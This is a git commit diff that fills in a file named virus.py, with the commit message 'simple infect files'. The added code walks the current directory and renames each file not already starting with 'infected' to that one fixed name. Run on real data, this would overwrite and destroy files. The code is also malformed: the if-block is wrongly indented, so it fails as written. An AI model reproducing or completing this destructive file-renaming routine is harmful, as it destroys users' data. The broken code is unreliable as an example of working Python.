a8fd6f7d613b4841c86660939f09ce0c55d1eadf
dfop02 <dfop02@hotmail.com>
2018-08-10 10:55:50 -0300

    simple infect files

--- virus.py
+++ virus.py
@@ -1,7 +1,14 @@
+from __future__ import print_function
 import os
 
-search():
-	pass
+def search():
+	for filename in os.listdir("."):
+		infect(filename)
 
-infect():
-	pass
+def infect(filename):
+	print (filename, end='')
+		if not filename.startswith("infected"):
+			print (" not infected...")
+			os.rename(filename, "infected")
+
+search()
